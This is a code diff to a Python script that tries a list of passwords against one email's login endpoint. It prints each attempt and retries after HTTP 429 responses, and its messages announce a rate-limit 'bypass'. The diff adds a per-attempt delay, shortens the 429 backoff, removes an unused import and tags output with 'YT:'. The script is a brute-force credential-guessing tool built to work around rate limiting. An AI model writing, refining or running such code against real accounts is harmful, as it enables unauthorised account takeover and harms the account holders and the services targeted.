@@ -1,6 +1,5 @@
 import requests
 import time
-import sys
 import os
 
 def main():
@@ -27,6 +26,7 @@ def main():
 
         for password in passwords:
             print(f"Testing password: {password}... ", end="")
+            time.sleep(0.5)
             login_result = test_login(email, password)
 
             if login_result:
@@ -62,13 +62,13 @@ def test_login(email, password):
             return True
         elif response.status_code == 429:
             print("YT: Too Many Requests Bypass Statuscode 429 successful!")
-            time.sleep(5)  # Delay to bypass rate limiting
+            time.sleep(1) 
             return test_login(email, password)
         else:
             print(response.status_code)
             return False
     except Exception as ex:
-        print(f"An error occurred: {str(ex)}")
+        print(f"YT: An error occurred: {str(ex)}")
         return False
 
 if __name__ == "__main__":
